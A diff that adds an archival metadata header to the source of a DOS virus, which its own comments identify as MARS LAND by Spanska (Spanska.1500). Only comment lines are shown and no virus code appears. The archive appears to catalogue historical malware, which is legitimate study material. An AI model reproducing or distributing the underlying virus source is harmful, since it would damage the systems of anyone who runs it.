@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      M
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; MARS LAND virus by Spanska
 ; Called Spanska.1500 by AV people
 ; This is my third virus
